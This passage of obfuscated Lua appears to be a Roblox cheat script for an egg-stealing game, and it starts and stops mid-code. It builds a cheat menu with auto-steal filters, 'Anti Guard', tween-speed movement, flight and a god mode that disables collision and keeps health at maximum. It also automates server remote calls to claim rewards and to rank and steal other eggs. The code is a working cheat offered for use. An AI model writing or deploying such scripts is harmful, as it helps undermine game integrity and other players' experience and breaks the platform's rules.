				tbl3.BeltHeld = function()
					return n9 > 0
				end

				tbl3.RefreshBeltHide = function()
					if n9 > 0 then
						fn13()
					end
				end

				fn4(function()
					n9 = 0
					fn14()
				end)

				tbl3.LeaveBelt = function()
					local rfTreadmillAskDoff = networking:FindFirstChild("RF/Treadmill/AskDoff")

					if rfTreadmillAskDoff and rfTreadmillAskDoff:IsA("RemoteFunction") then
						pcall(rfTreadmillAskDoff.InvokeServer, rfTreadmillAskDoff)
					end
				end

				tbl3.Treadmill = { Riding = false }

				tbl3.ResetBelt = function()
					n9 = 0
					fn14()
				end

				tbl3.OnBelt = function()
					local v23 = tbl3.Belt()
					if not v23 or tbl24[v23] then
						return false
					end
					local v24 = tbl3.Root()
					if not v24 then
						return false
					end
					local v25 = v23.CFrame:PointToObjectSpace(v24.Position)
					local n10 = v23.Size.X / 2 + 2
					local flag3 = math.abs(v25.X) <= n10
					local flag4

					if flag3 then
						local n11 = v23.Size.Z / 2 + 2
						flag4 = math.abs(v25.Z) <= n11
					else
						flag4 = flag3
					end

					return flag4 and v25.Y >= -2 and v25.Y <= v23.Size.Y / 2 + 8
				end
			end

			tbl3.ExitBelt = function()
				tbl3.Treadmill.Riding = false
				tbl3.LeaveBelt()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					pcall(function()
						humanoid.Jump = true
						humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					end)
				end

				task.wait(0.35)
			end

			tbl3.Flying = false
			tbl3.Driving = 0

			tbl3.BeginFlight = function()
				tbl3.Flying = true
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = true

					pcall(function()
						humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
					end)
				end

				return tbl3.Root() ~= nil
			end

			tbl3.SetFlightVelocity = function(assemblyLinearVelocity)
				local v23 = tbl3.Root()

				if v23 then
					v23.AssemblyLinearVelocity = assemblyLinearVelocity
					v23.AssemblyAngularVelocity = Vector3.zero
				end
			end

			tbl3.EndFlight = function()
				tbl3.Flying = false
				local v23 = tbl3.Root()

				if v23 then
					pcall(function()
						v23.AssemblyLinearVelocity = Vector3.zero
						v23.AssemblyAngularVelocity = Vector3.zero
					end)
				end

				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end
			end

			do
				local tbl24 = {
					Enum.HumanoidStateType.FallingDown,
					Enum.HumanoidStateType.Ragdoll,
					Enum.HumanoidStateType.Physics,
					Enum.HumanoidStateType.Seated,
					Enum.HumanoidStateType.PlatformStanding,
				}

				local tbl25 = {}
				local flag3 = false

				tbl3.GodMode = function(arg)
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")
					if not character or not humanoid then
						return
					end

					if arg then
						flag3 = true

						for _, v23 in ipairs(tbl24) do
							pcall(function()
								humanoid:SetStateEnabled(v23, false)
							end)
						end

						pcall(function()
							humanoid.BreakJointsOnDeath = false
						end)

						for _, descendant in ipairs(character:GetDescendants()) do
							if descendant:IsA("BasePart") and tbl25[descendant] == nil then
								tbl25[descendant] = descendant.CanCollide

								pcall(function()
									descendant.CanCollide = false
								end)
							end
						end
					elseif flag3 then
						flag3 = false

						for _, v23 in ipairs(tbl24) do
							pcall(function()
								humanoid:SetStateEnabled(v23, true)
							end)
						end

						for k, v23 in pairs(tbl25) do
							if k and k.Parent then
								pcall(function()
									k.CanCollide = v23
								end)
							end
						end

						table.clear(tbl25)
					end
				end
			end

			tbl3.GodTick = function()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid and humanoid.Health < humanoid.MaxHealth then
					pcall(function()
						humanoid.Health = humanoid.MaxHealth
					end)
				end
			end

			tbl3.StopWalking = function()
				local character = localPlayer.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid and humanoidRootPart then
					pcall(function()
						humanoid:MoveTo(humanoidRootPart.Position)
						humanoid:Move(Vector3.zero, false)
					end)
				end
			end

			local function fn12(arg, arg2, arg3, arg4)
				local n9 = tonumber(arg2) or 6
				local n10 = tonumber(arg3) or 10
				local n11 = 0
				local position = nil
				local n12 = 0
				local n13 = 0

				while n11 < n10 do
					if type(arg4) == "function" and arg4() then
						tbl3.StopWalking()
						return false
					end
					local character = localPlayer.Character
					local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
					character = character and character:FindFirstChildOfClass("Humanoid")
					if not humanoidRootPart or not character or character.Health <= 0 then
						return false
					end

					if (humanoidRootPart.Position - arg).Magnitude <= n9 then
						tbl3.StopWalking()
						return true
					end

					if position and (humanoidRootPart.Position - position).Magnitude < 1 then
						n12 += 0.2
					else
						n12 = 0
					end

					position = humanoidRootPart.Position
					n13 = math.max(0, n13 - 0.2)

					if n12 >= 0.8 and n13 <= 0 then
						tbl3.LeaveBelt()

						pcall(function()
							character.Jump = true
						end)

						n12 = 0
						n13 = 1.5
					end

					character:MoveTo(arg)
					n11 += task.wait(0.2)
				end

				tbl3.StopWalking()
				return tbl3.DistanceTo(arg) <= n9
			end

			tbl3.WalkTo = function(arg, arg2, arg3, arg4)
				tbl3.Driving = tbl3.Driving + 1
				local ok, result = pcall(fn12, arg, arg2, arg3, arg4)
				tbl3.Driving = math.max(0, tbl3.Driving - 1)
				return ok and result == true
			end

			local tbl24 = {
				Boss = "Fractured",
				GreatBloom = "Spirit Bloom",
				Sakura = "Bloom",
				Monstrous = "Parasite",
			}

			task.spawn(function()
				local mutations = tbl.Mutations

				local ok, result = pcall(function()
					return mutations.All()
				end)

				if ok and type(result) == "table" then
					for k, v23 in pairs(result) do
						local flag3 = type(v23) == "table"
						local id

						if flag3 then
							id = v23.Id or k
						else
							id = flag3
						end

						id = id or nil
						local label = type(v23) == "table" and v23.Label or nil

						if id ~= nil and type(label) == "string" and label ~= "" then
							tbl24[tostring(id)] = label
						end
					end
				end
			end)

			fn6 = function(arg)
				return tbl24[tostring(arg)] or tostring(arg)
			end

			local tbl25, tbl26, n9, tbl27, tbl28, tbl29, tbl30, flag3, tbl31, n10
			local v23, n11, fn13

			do
				local tbl32 = {
					"Forest",
					"Desert",
					"Snow",
					"Lake",
					"Jungle",
					"Volcano",
					"Prehistoric",
					"Cosmic",
					"Abyss Ocean",
					"Cherry Blossom",
					"Light Dark",
					"Titan Temple",
				}

				local tbl33 = {}

				for _, v24 in ipairs(tbl32) do
					tbl33[v24] = true
				end

				task.spawn(function()
					local eggState = tbl.EggState

					local ok, result = pcall(function()
						return eggState.ReadFieldEggs()
					end)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						for _, record in pairs(result.Records) do
							local areaId = type(record) == "table" and record.AreaId or nil

							if type(areaId) == "string" and not tbl33[areaId] then
								tbl33[areaId] = true
								table.insert(tbl32, areaId)
							end
						end
					end
				end)

				tbl11 = { "Any" }
				tbl12 = { Any = 0 }
				local tbl34 = {}
				local directory = tbl.Assets and tbl.Assets.Directory

				if type(directory) == "table" then
					for _, v24 in pairs(directory) do
						local rarity = type(v24) == "table" and v24.Rarity or nil
						local flag4 = type(rarity) == "table"

						if flag4 then
							flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
						end

						flag4 = flag4 or nil

						if flag4 then
							local v25 = tbl34[flag4]
							local str2

							if v25 then
								str2 = v25
							else
								str2 = tostring(rarity.DisplayName or rarity._id or flag4)
							end

							tbl34[flag4] = str2
						end
					end
				end

				if next(tbl34) == nil then
					tbl34 = {
						"Common",
						"Uncommon",
						"Rare",
						"Epic",
						"Legendary",
						"Mythic",
						"Cosmic",
						"Secret",
						"Eternal",
						"Divine",
					}
				end

				local tbl35 = {}

				for k in pairs(tbl34) do
					table.insert(tbl35, k)
				end

				table.sort(tbl35)

				for _, v24 in ipairs(tbl35) do
					table.insert(tbl11, tbl34[v24])
					tbl12[tbl34[v24]] = v24
				end

				tbl25 = {
					"Best Rarity",
					"Biggest Weight",
					"Best Mutation",
					"Highest Value",
					"Lowest Value",
				}

				tbl26 = {}
				n9 = 0
				tbl27 = {}
				tbl28 = {}
				tbl29 = {}
				tbl30 = {}
				tbl3.Steal.RiftPriority = false
				tbl3.Steal.RiftNeeds = {}
				flag3 = false
				tbl31 = {}
				n10 = 0
				v23 = tbl25[4]
				n = 400
				n11 = 27.4
				n2 = 400
				fn13 = nil

				v4 = v22:CreateToggle({
					Name = "Auto Steal",
					Default = false,
					Callback = function()
						if fn13 then
							fn13()
						end
					end,
				})

				for _, v24 in ipairs(tbl32) do
					tbl26[v24] = true
				end

				fn5(v22:CreateMultiDropdown({
					Name = "Target Areas",
					Options = tbl32,
					Default = tbl32,
					Callback = function(arg)
						local tbl36 = {}

						if type(arg) == "table" then
							for k, v24 in pairs(arg) do
								if v24 == true and type(k) == "string" then
									tbl36[k] = true
								elseif type(v24) == "string" then
									tbl36[v24] = true
								end
							end
						end

						if next(tbl36) == nil then
							for _, v24 in ipairs(tbl32) do
								tbl36[v24] = true
							end
						end

						tbl26 = tbl36
					end,
				}))
			end

			v22:CreateDropdown({
				Name = "Min Rarity",
				Note = "Steal eggs of the chosen rarity and every rarity above it",
				Options = tbl11,
				Default = tbl11[1],
				Callback = function(arg)
					n9 = tbl12[arg] or 0
				end,
			})

			do
				local tbl32 = {
					["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
					["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
					["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
				}

				local v24 = nil
				local n12 = 0
				local str2 = "M/s"

				local function fn14(arg, arg2)
					if arg ~= nil then
						n12 = math.max(0, math.floor(tonumber(arg) or n12))
					end

					if arg2 ~= nil then
						str2 = tostring(arg2)
					end

					n10 = n12 * (tbl32[str2] or tbl32["M/s"]).Mult
				end

				v24 = v22:CreateSlider({
					Name = "Min Value To Steal",
					Note = "Skip eggs worth less than this (0 = off)",
					Min = 0,
					Max = 1000,
					Default = 0,
					AllowDecimals = false,
					Increment = 1,
					Unit = {
						Default = "M/s",
						Selector = true,
						Options = { "K/s", "M/s", "B/s" },
						ColorEnabled = true,
						Colors = {
							Number = Color3.fromRGB(255, 255, 255),
							Suffix = Color3.fromRGB(58, 255, 55),
						},
						Callback = function(arg)
							local ms = tbl32[arg] or tbl32["M/s"]

							if v24 and v24.SetRange then
								v24:SetRange(ms.Min, ms.Max)
								local min = tonumber(v24:Get()) or ms.Min
								local min2 = ms.Min
								local max = ms.Max
								local n13 = math.clamp(math.floor(min + 0.5), min2, max)

								if n13 ~= min then
									str2 = tostring(arg)
									v24:Set(n13)
									return
								end

								fn14(n13, arg)
							else
								fn14(nil, arg)
							end
						end,
					},
					Callback = function(arg)
						fn14(arg, nil)
					end,
				})
			end

			do
				local tbl32 = {}
				local tbl33 = {}
				local directory = tbl.Assets and tbl.Assets.Directory
				local tbl34 = {}

				if type(directory) == "table" then
					for k, v24 in pairs(directory) do
						local rarity = type(v24) == "table" and v24.Rarity or nil
						local flag4 = type(rarity) == "table"
						local num

						if flag4 then
							num = tonumber(rarity.RarityNumber or rarity.Rank)
						else
							num = flag4
						end

						local v25 = num or nil

						if v25 then
							table.insert(tbl34, {
								Category = tostring(k),
								Name = tostring(v24.DisplayName or k),
								Rarity = v25,
								RarityName = tostring(rarity.DisplayName or rarity._id or v25),
							})
						end
					end
				end

				table.sort(tbl34, function(arg, arg2)
					if arg.Rarity ~= arg2.Rarity then
						return arg.Rarity > arg2.Rarity
					end
					return arg.Name < arg2.Name
				end)

				for _, v24 in ipairs(tbl34) do
					local str2 = string.format("%s [%s]", v24.Name, v24.RarityName)

					if tbl33[str2] then
						str2 = string.format("%s [%s] (%s)", v24.Name, v24.RarityName, v24.Category)
					end

					table.insert(tbl32, str2)
					tbl33[str2] = v24.Category
				end

				fn5(v22:CreateMultiDropdown({
					Name = "Target Specific Eggs",
					Note = "Only steal these eggs (empty = all)",
					Options = tbl32,
					Default = {},
					Callback = function(arg)
						local tbl35 = {}

						if type(arg) == "table" then
							for k, v24 in pairs(arg) do
								k = v24 == true and type(k) == "string" and k or type(v24) == "string" and v24 or nil

								if k and tbl33[k] then
									tbl35[tbl33[k]] = true
								end
							end
						end

						tbl27 = tbl35
					end,
				}))
			end

			do
				local n12 = 30
				local v24 = nil
				local flag4 = false
				local n13 = 0

				local function fn14()
					local tbl32 = {}
					local save = tbl.Save

					if type(save) == "table" and type(save.Get) == "function" then
						local ok, result = pcall(save.Get)

						if ok and type(result) == "table" then
							local v25 = pairs
							local inventory = result.Inventory or {}

							for _, v26 in v25(inventory) do
								if type(v26) == "table" and v26.Category ~= nil then
									tbl32[tostring(v26.Category)] = true
								end
							end

							local v26 = pairs
							local eggInventory = result.EggInventory or {}

							for _, v27 in v26(eggInventory) do
								if type(v27) == "table" and v27.AssetCategory ~= nil then
									tbl32[tostring(v27.AssetCategory)] = true
								end
							end
						end
					end

					return tbl32
				end

				local function fn15()
					local rfRiftAskState = networking:FindFirstChild("RF/Rift/AskState")
					if not rfRiftAskState or not rfRiftAskState:IsA("RemoteFunction") then
						return
					end
					local ok, result = pcall(rfRiftAskState.InvokeServer, rfRiftAskState)
					if not ok or type(result) ~= "table" or type(result.Requirements) ~= "table" then
						return
					end
					local v25 = fn14()
					local riftNeeds = {}

					for _, requirement in pairs(result.Requirements) do
						if not v25[tostring(requirement)] then
							riftNeeds[tostring(requirement)] = true
						end
					end

					tbl3.Steal.RiftNeeds = riftNeeds
				end

				tbl2.Add(function()
					if not tbl3.Steal.RiftPriority or flag4 or os.clock() < n13 then
						return false
					end
					flag4 = true
					n13 = os.clock() + n12

					task.spawn(function()
						pcall(fn15)
						flag4 = false
					end)

					return false
				end)

				local function fn16()
					local riftNeeds = tbl3.Steal.RiftNeeds
					if not tbl3.Steal.RiftPriority or next(riftNeeds) == nil then
						return
					end
					local v25 = fn14()
					local flag5 = false

					for k in pairs(riftNeeds) do
						if v25[k] then
							riftNeeds[k] = nil
							flag5 = true
						end
					end

					if flag5 then
						tbl2.Wake()
					end
				end

				local save = tbl.Save

				if type(save) == "table" and type(save.FieldSignal) == "function" then
					for _, v25 in ipairs({ "EggInventory", "Inventory" }) do
						local ok, result = pcall(save.FieldSignal, v25)

						if ok and type(result) == "table" and type(result.Connect) == "function" then
							local ok2, result2 = pcall(result.Connect, result, function()
								task.defer(fn16)
							end)

							if ok2 and result2 then
								fn4(function()
									pcall(function()
										result2:Disconnect()
									end)
								end)
							end
						end
					end
				end

				v24 = v22:CreateToggle({
					Name = "Steal Missing Rift Eggs",
					Note = "Steal eggs the Rift recipe needs, after your filtered targets",
					Default = false,
					Callback = function()
						tbl3.Steal.RiftPriority = tbl3.Toggle(v24, false) == true
						n13 = 0

						if not tbl3.Steal.RiftPriority then
							tbl3.Steal.RiftNeeds = {}
						end

						tbl2.Wake()
					end,
				})
			end

			do
				local n12 = 5
				local n13 = 5
				local n14 = 60
				local v24 = nil
				local v25 = nil
				local n15 = 0
				local n16 = 0
				local flag4 = false
				local tbl32 = {}

				local function fn14()
					local save = tbl.Save

					if type(save) == "table" and type(save.Get) == "function" then
						local ok, result = pcall(save.Get)
						if ok and type(result) == "table" then
							return result
						end
					end

					return nil
				end

				local function fn15()
					local v26 = fn14()
					local directory = tbl.Areas and tbl.Areas.Directory
					local directory2 = tbl.Assets and tbl.Assets.Directory
					if not v26 or type(directory) ~= "table" or type(directory2) ~= "table" then
						return
					end
					local index = type(v26.Index) == "table" and v26.Index or {}
					local tbl33 = {}
					local v27 = pairs
					local inventory = v26.Inventory or {}

					for _, v28 in v27(inventory) do
						if type(v28) == "table" and v28.Category ~= nil then
							tbl33[tostring(v28.Category)] = true
						end
					end

					local v28 = pairs
					local eggInventory = v26.EggInventory or {}

					for _, v29 in v28(eggInventory) do
						if type(v29) == "table" and v29.AssetCategory ~= nil then
							tbl33[tostring(v29.AssetCategory)] = true
						end
					end

					local tbl34 = {}

					for _, v29 in pairs(directory) do
						local flag5 = type(v29) == "table" and type(v29.Rarity) == "table"

						if flag5 then
							flag5 = tonumber(v29.Rarity.RarityNumber or v29.Rarity.Rank)
						end

						flag5 = flag5 or 0
						local v30 = pairs
						local dropTable = type(v29) == "table" and v29.DropTable or {}

						for _, v31 in v30(dropTable) do
							local flag6 = type(v31) == "table" and v31[1] or nil
							local n17 = type(v31) == "table" and tonumber(v31[2]) or 0
							local flag7 = flag6 ~= nil and directory2[flag6] or nil

							if type(flag7) == "table" and n17 > 0 and flag7.DontRoll ~= true then
								local str2 = tostring(flag6)
								local flag8 = index[flag6] ~= true and not tbl33[str2]
								local flag9

								if flag8 then
									flag9 = tbl34[str2] == nil or flag5 > tbl34[str2]
								else
									flag9 = flag8
								end

								if flag9 then
									tbl34[str2] = flag5
								end
							end
						end
					end

					tbl31 = tbl34
				end

				local function fn16(arg, ...)
					local v26 = networking:FindFirstChild(arg)
					if not v26 or not v26:IsA("RemoteFunction") then
						return false
					end
					local ok, result = pcall(v26.InvokeServer, v26, ...)
					return ok and result ~= false
				end

				local function fn17(arg, arg2)
					local tbl33 = {}
					if type(arg) ~= "table" then
						return tbl33
					end

					for _, v26 in ipairs(arg2) do
						local flag5 = arg

						for _, v27 in ipairs(v26) do
							flag5 = type(flag5) == "table" and flag5[v27] or nil
						end

						local v27 = ipairs
						local tbl34 = type(flag5) == "table" and flag5 or {}

						for _, v28 in v27(tbl34) do
							if type(v28) == "table" and v28.AssetId ~= nil then
								table.insert(tbl33, v28.AssetId)
							end
						end
					end

					return tbl33
				end

				local tbl33 = {
					{
						Id = "LimitedEgg",
						Gear = "GravityDisruptor",
						Module = "LimitedEgg",
						Lists = { { "Entries" }, { "MechaReroll", "Entries" } },
					},
					{
						Id = "BrainrotEgg",
						Gear = "BeeLauncher",
						Module = "BrainrotEgg",
						Lists = { { "Entries" } },
					},
					{
						Id = "MonsterEgg",
						Gear = "BeeLauncher",
						Module = "MonsterEgg",
						Lists = { { "Entries" }, { "MechaEntries" } },
					},
				}

				local function fn18()
					local v26 = fn14()
					if not v26 then
						return
					end
					local index = type(v26.Index) == "table" and v26.Index or {}
					local indexClaimedCategories = type(v26.IndexClaimedCategories) == "table" and v26.IndexClaimedCategories or {}

					for k, v27 in pairs(index) do
						if v27 == true and indexClaimedCategories[k] ~= true then
							fn16("RF/Codex/AskRedeemAll")
							break
						end
					end

					local gearInventory = type(v26.GearInventory) == "table" and v26.GearInventory or {}

					for _, v27 in ipairs(tbl33) do
						local flag5 = (tonumber(gearInventory[v27.Gear]) or 0) <= 0

						if flag5 then
							flag5 = os.clock() >= (tbl32[v27.Id] or 0)
						end

						if flag5 then
							local v28 = fn17(tbl[v27.Module], v27.Lists)
							local flag6 = #v28 > 0

							for _, v29 in ipairs(v28) do
								if index[v29] ~= true then
									flag6 = false
									break
								end
							end

							if flag6 then
								tbl32[v27.Id] = os.clock() + n14
								fn16("RF/Codex/AskRedeemLimitedEgg", v27.Id)
							end
						end
					end
				end

				tbl2.Add(function()
					local now = os.clock()

					if flag3 and now >= n15 then
						n15 = now + n12
						pcall(fn15)
					end

					if not flag4 and now >= n16 and tbl3.Toggle(v25, false) then
						flag4 = true
						n16 = now + n13

						task.spawn(function()
							pcall(fn18)
							flag4 = false
						end)
					end

					return false
				end)

				v24 = v22:CreateToggle({
					Name = "Steal Missing Index Eggs",
					Note = "Also steal eggs missing from your index, highest area first",
					Default = false,
					Callback = function()
						flag3 = tbl3.Toggle(v24, false) == true
						n15 = 0

						if not flag3 then
							tbl31 = {}
						end

						tbl2.Wake()
					end,
				})

				v25 = v22:CreateToggle({
					Name = "Auto Claim Index",
					Note = "Claim index rewards as soon as they unlock",
					Default = false,
					Callback = function()
						n16 = 0
						tbl2.Wake()
					end,
				})
			end

			v22:CreateDropdown({
				Name = "Steal Priority",
				Options = tbl25,
				Default = tbl25[4],
				Callback = function(arg)
					if table.find(tbl25, arg) then
						v23 = arg
					end
				end,
			})

			v5 = v22:CreateSlider({
				Name = "Tween Speed",
				Min = 100,
				Max = 1000,
				Default = 400,
				Increment = 10,
				Unit = "studs/s",
				Callback = function(arg)
					local n12 = math.clamp(tonumber(arg) or 400, 100, 1000)
					n = n12
					n2 = n12
				end,
			})

			tbl3.AntiGuard.PanelHandle = v22:CreateToggle({
				Name = "Anti Guard V1",
				Note = "Not recommended to use with Auto Steal",
				Default = false,
				Callback = function(panelShown)
					if type(panelShown) ~= "boolean" then
						panelShown = tbl3.Toggle(tbl3.AntiGuard.PanelHandle, false)
					end

					tbl3.AntiGuard.PanelShown = panelShown

					if tbl3.AntiGuard.ShowPanel then
						pcall(tbl3.AntiGuard.ShowPanel, panelShown)
					end
				end,
			})

			local v24
			v24 = nil
			local v25
			v25 = nil
			local v26
			v26 = nil
			local str2
			str2 = "None"
			local str3
			str3 = "Idle"
			local flag4
			flag4 = false
			local n12
			n12 = 0
			local tbl32
			tbl32 = {}
			local n13
			n13 = 20
			local uid
			uid = nil
			local fn14

			fn14 = function(arg)
				return arg ~= n12 or not tbl3.Toggle(v24, false)
			end

			local fn15

			do
				local tbl33 = {}

				local function fn16(arg)
					if type(arg) ~= "number" or tbl33[arg] then
						return
					end
					tbl33[arg] = true

					task.delay(math.max(0, arg - workspace:GetServerTimeNow()) + 0.05, function()
						tbl33[arg] = nil
						tbl2.Wake()
					end)
				end

				local n14 = 0

				fn15 = function()
					local areaEggCycle = tbl.AreaEggCycle
					if type(areaEggCycle) ~= "table" then
						return nil
					end

					local ok, result, result2, result3, result4 = pcall(function()
						local serverTimeNow = workspace:GetServerTimeNow()
						local nextResetTime = areaEggCycle.NextResetTime
						return serverTimeNow, areaEggCycle.IsNightPhase(serverTimeNow), areaEggCycle.NextNightTime(serverTimeNow), nextResetTime(serverTimeNow)
					end)

					if not ok or type(result4) ~= "number" then
						return nil
					end

					if result2 == true then
						n14 = result4 + tbl3.WallOpenDelay()
						fn16(n14)
						return n14, "night", result
					end

					if tbl3.WallSealed() then
						fn16(result + 0.3)
						return math.max(n14, result), "wall", result
					end

					if type(result3) == "number" and result3 > result then
						fn16(result3)
					end

					return nil
				end
			end

			do
				local areaEggResetWall = tbl.AreaEggResetWall
				local changed = type(areaEggResetWall) == "table" and areaEggResetWall.Changed or nil

				if changed and type(changed.Connect) == "function" then
					local ok, result = pcall(function()
						return changed:Connect(function()
							tbl2.Wake()
						end)
					end)

					if ok and result then
						fn4(function()
							pcall(function()
								result:Disconnect()
							end)
						end)
					end
				end
			end

			local n14
			n14 = 8
			local v27
			v27 = nil
			local n15
			n15 = 0
			local fn16, fn17, fn18

			local function fn19(arg)
				local tbl33 = {}
				local str4 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local eggState = tbl.EggState

				if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
					task.spawn(function()
						local ok, result = pcall(eggState.ReadFieldEggs)

						if ok and type(result) == "table" and type(result.Records) == "table" then
							for _, record in pairs(result.Records) do
								local flag5 = type(record) == "table" and type(record.Uid) == "string"

								if flag5 then
									flag5 = not (arg and string.sub(record.Uid, 1, #str4) == str4)
								end

								if flag5 then
									tbl33[record.Uid] = true
								end
							end
						end
					end)
				end

				return tbl33
			end

			fn16 = function()
				return v27 ~= nil and os.clock() < n15
			end

			fn17 = function()
				if v27 and n15 == math.huge then
					return
				end
				v27 = fn19(true)
				n15 = math.huge
				table.clear(tbl28)
				table.clear(tbl30)
				table.clear(tbl29)
				table.clear(tbl32)
				uid = nil
			end

			fn18 = function()
				if not v27 then
					return false
				end

				if n15 <= os.clock() then
					v27 = nil
					return false
				end
				local v28 = fn19()
				if next(v28) == nil then
					return true
				end
				local flag5 = false
				local flag6 = false

				for k in pairs(v28) do
					if v27[k] then
						flag5 = true
					else
						flag6 = true
					end
				end

				if not flag5 then
					v27 = nil
					return false
				end
				return not flag6
			end

			local fn20

			do
				local function fn21(arg)
					local directory = tbl.Assets and tbl.Assets.Directory
					local flag5 = type(directory) == "table" and directory[tostring(arg)] or nil
					local rarity = type(flag5) == "table" and type(flag5.Rarity) == "table" and flag5.Rarity or nil
					local tbl33 = {}
					local rarityNumber

					if rarity then
						rarityNumber = tonumber(rarity.RarityNumber or rarity.Rank)
					else
						rarityNumber = rarity
					end

					tbl33.RarityNumber = rarityNumber or 0
					tbl33.EarningRate = type(flag5) == "table" and tonumber(flag5.EarningRate) or 0
					return tbl33
				end

				local function fn22(arg)
					local mutations = tbl.Mutations

					if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
						local ok, result = pcall(mutations.EarningsFor, type(arg) == "table" and arg or {})
						if ok and type(result) == "number" then
							return result
						end
					end

					return 1
				end

				local function fn23(arg, arg2)
					local eggRecords = tbl.EggRecords

					if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
						local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
						if ok and type(result) == "number" then
							return result
						end
					end

					return 0
				end

				fn20 = function(arg, arg2)
					local records = nil
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
						task.spawn(function()
							local ok, result = pcall(eggState.ReadFieldEggs)

							if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
								records = result.Records
							end
						end)
					end

					if not records then
						local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
						if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
							return {}
						end
						local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
						records = ok and type(result) == "table" and result.Records or nil
					end

					if type(records) ~= "table" then
						return {}
					end
					local tbl33 = {}
					local tbl34 = {}

					for _, record in pairs(records) do
						local uid2 = type(record) == "table" and record.Uid or nil

						if uid2 and record.State ~= "Claimed" then
							tbl34[uid2] = true
						end

						local flag5 = record.State == "Carried" and arg2 == true and arg ~= true and not (tbl3.Steal.Carrying and uid2 == tbl3.Steal.CarryUid)
						local flag6

						if uid2 then
							flag6 = record.State == "Slot" or record.State == "Dropped" or flag5
						else
							flag6 = uid2
						end

						local v28 = uid2 and tbl28[uid2] or nil
						local flag7 = uid2 and tbl29[uid2] == true or false
						local flag8 = arg ~= true and flag3 and uid2 and tbl31[tostring(record.AssetCategory)] or nil
						local flag9 = arg ~= true and tbl3.Steal.RiftPriority == true and uid2 ~= nil and tbl3.Steal.RiftNeeds[tostring(record.AssetCategory)] == true
						local flag10 = arg == true or v28 ~= nil or flag7 or flag9 or flag8 ~= nil or tbl26[tostring(record.AreaId)] == true
						local flag11 = arg ~= true and v28 == nil and tbl30[uid2] == true
						local flag12 = v27 ~= nil and v27[uid2] == true
						flag6 = flag6 and typeof(record.BottomCFrame) == "CFrame"

						if flag6 then
							flag6 = (tbl32[uid2] or 0) <= os.clock()
						end

						if flag6 and flag10 and not flag11 and not flag12 then
							local v29 = fn21(record.AssetCategory)
							local str4 = tostring(record.AssetCategory)
							local flag13 = v29.RarityNumber >= n9
							local flag14 = next(tbl27) == nil or tbl27[str4] == true
							local n16 = tonumber(record.AssetScale) or 1
							local v30 = fn22(record.Mutations)
							local n17 = n16 > 5 and (n16 / 5) ^ 1.2 * 19.637875755794113 or n16 ^ 1.85
							local flag15 = n10 <= 0 or v29.EarningRate * n17 * v30 >= n10
							flag15 = flag13 and flag14 and flag15
							local flag16 = flag9 and not flag15 and not flag7 and v28 == nil and flag8 == nil

							if arg == true or v28 or flag7 or flag9 or flag8 ~= nil or flag15 then
								table.insert(tbl33, {
									Uid = uid2,
									Category = str4,
									Scale = n16,
									State = record.State,
									Rarity = v29.RarityNumber,
									Weight = fn23(record.AssetCategory, n16),
									Mutation = v30,
									Value = v29.EarningRate * n17 * v30,
									CFrame = record.BottomCFrame,
									AreaId = tostring(record.AreaId),
									Rift = arg ~= true and flag9,
									RiftOnly = arg ~= true and flag16,
									Index = flag8,
									Forced = arg ~= true and v28 and v28.At or nil,
									Priority = arg ~= true and flag7,
								})
							end
						end
					end

					if next(tbl34) ~= nil then
						for k in pairs(tbl28) do
							if not tbl34[k] then
								tbl28[k] = nil
							end
						end

						for k in pairs(tbl29) do
							if not tbl34[k] then
								tbl29[k] = nil
							end
						end

						for k in pairs(tbl30) do
							if not tbl34[k] then
								tbl30[k] = nil
							end
						end
					end

					table.sort(tbl33, function(arg3, arg4)
						if arg3.Forced ~= nil ~= arg4.Forced ~= nil then
							return arg3.Forced ~= nil
						end

						if arg3.Forced and arg4.Forced and arg3.Forced ~= arg4.Forced then
							return arg3.Forced < arg4.Forced
						end

						if arg3.Priority ~= arg4.Priority then
							return arg3.Priority == true
						end

						if arg3.RiftOnly ~= arg4.RiftOnly then
							return arg4.RiftOnly == true
						end

						if arg3.Index ~= nil ~= arg4.Index ~= nil then
							return arg3.Index ~= nil
						end

						if arg3.Index and arg4.Index and arg3.Index ~= arg4.Index then
							return arg3.Index > arg4.Index
						end

						if v23 == tbl25[2] and arg3.Weight ~= arg4.Weight then
							return arg3.Weight > arg4.Weight
						end

						if v23 == tbl25[3] and arg3.Mutation ~= arg4.Mutation then
							return arg3.Mutation > arg4.Mutation
						end

						if v23 == tbl25[4] and arg3.Value ~= arg4.Value then
							return arg3.Value > arg4.Value
						end

						if v23 == tbl25[5] and arg3.Value ~= arg4.Value then
							return arg3.Value < arg4.Value
						end

						if arg3.Rarity ~= arg4.Rarity then
							return arg3.Rarity > arg4.Rarity
						end

						if arg3.Value ~= arg4.Value then
							return arg3.Value > arg4.Value
						end
						return tostring(arg3.Uid) < tostring(arg4.Uid)
					end)

					return tbl33
				end
			end

			local n16
